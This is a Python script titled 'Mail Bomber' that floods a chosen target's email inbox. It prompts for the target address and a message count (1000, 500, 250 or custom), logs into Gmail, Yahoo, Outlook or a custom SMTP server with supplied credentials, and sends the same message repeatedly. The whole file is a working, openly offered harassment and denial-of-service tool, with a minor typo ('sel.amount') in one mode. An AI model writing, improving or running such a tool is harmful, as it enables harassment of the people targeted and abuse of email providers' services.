#!/usr/bin/env python3

import smtplib
import sys
import signal

def def_handler(sig, frame):
    print("\nExit...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def banner():
    print("+[+[+[ Mail Bomber :D ]+]+]+")
    print("+[+[+[ made with python ]+]+]+")
    print("""                 .    
                 .               
                 .       :       
                 :      .        
        :..   :  : :  .          
           ..  ; :: .            
              ... .. :..         
             ::: :...            
         ::.:.:...;; .....       
      :..     .;.. :;     ..     
            . :. .  ;.           
             .: ;;: ;.           
            :; .BRRRV;           
               YB BMMMBR         
              ;BVIMMMMMt         
        .=YRBBBMMMMMMMB          
      =RMMMMMMMMMMMMMM;          
    ;BMMR=VMMMMMMMMMMMV.         
   tMMR::VMMMMMMMMMMMMMB:        
  tMMt ;BMMMMMMMMMMMMMMMB.        __  __       _ _   ____                  _               
 ;MMY ;MMMMMMMMMMMMMMMMMMV       |  \/  | __ _(_) | | __ )  ___  _ __ ___ | |__   ___ _ __ 
 XMB .BMMMMMMMMMMMMMMMMMMM:      | |\/| |/ _` | | | |  _ \ / _ \| '_ ` _ \| '_ \ / _ \ '__|
 BMI +MMMMMMMMMMMMMMMMMMMMi      | |  | | (_| | | | | |_) | (_) | | | | | | |_) |  __/ |   
.MM= XMMMMMMMMMMMMMMMMMMMMY      |_|  |_|\__,_|_|_| |____/ \___/|_| |_| |_|_.__/ \___|_|   
 BMt YMMMMMMMMMMMMMMMMMMMMi      
 VMB +MMMMMMMMMMMMMMMMMMMM:             ___.                                .__ 
 ;MM+ BMMMMMMMMMMMMMMMMMMR              \_ |__   ___.__.     ____    _____  |__|
  tMBVBMMMMMMMMMMMMMMMMMB.        	 | __ \ <   |  |   _/ __ \  /     \ |  |
   tMMMMMMMMMMMMMMMMMMMB:         	 | \_\ \ \___  |   \  ___/ |  Y Y  \|  |
    ;BMMMMMMMMMMMMMMMMY           	 |___  / / ____|    \___  >|__|_|  /|__|
      +BMMMMMMMMMMMBY:             	     \/  \/             \/       \/     
        :+YRBBBRVt;""")


class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(f"\n+[+[+[ Initializing program ]+]+]+")
            self.target = str(input("Enter target email: "))
            self.mode = int(input("Enter BOMB mode (1, 2, 3, 4) || 1:(1000), 2:(500), 3:(250, 4:(custom) : "))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print("ERROR: Invalid Option. GoodBye...")
                sys.exit(1)
        except Exception as e:
            print(f"ERROR: {e}")

    def bomb(self):
        try:
            print(f"\n +[+[+[ Setting up bomb ]+]+]+")
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                sel.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input("Choose a custom amount: "))
            print(f"\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+")
        except Exception as e:
            print(f"ERROR: {e}")

    def email(self):
        try:    
           print(f"\n +[+[+[ Setting up email ]+]+]+")
           self.server = str(input("Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook : "))
           premade = ['1', '2', '3']
           default_port = True

           if self.server not in premade:
               default_port = False
               self.port = int(input("Enter port number: "))

           if default_port == True:
               self.port = int(587)

           if self.server == '1':
               self.server = "smtp.gmail.com"
           elif self.server == '2':
               self.server = "smtp.mail.yahoo.com"
           elif self.server == '3':
               self.server = "smtp-mail.outlook.com"
           
           self.fromAddr = str(input("Enter from addres: "))
           self.fromPwd = str(input("Enter from password: "))
           self.subject = str(input("Enter subject: "))
           self.message = str(input("Enter message: "))

           self.msg = '''From: %s\nTo: %s\nSubject: %s\n%s\n
           ''' % (self.fromAddr, self.target, self.subject, self.message)

           self.s = smtplib.SMTP(self.server, self.port)
           self.s.ehlo()
           self.s.starttls()
           self.s.ehlo()
           self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f"ERROR: {e}")

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(f"BOMB: {self.count}")
        except Exception as e:
            print(f"ERROR: {e}")

    def attack(self):
        try:
            print("\n +[+[+[ Attacking... ]+]+]+")
            for email in range(self.amount+1):
                self.send()
            self.s.close()
            print("\n +[+[+[ Attack finished ]+]+]+")
            sys.exit(0)
        except Exception as e:
            print(f"ERROR: {e}")

def main():
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()


if __name__ == '__main__':
    main()
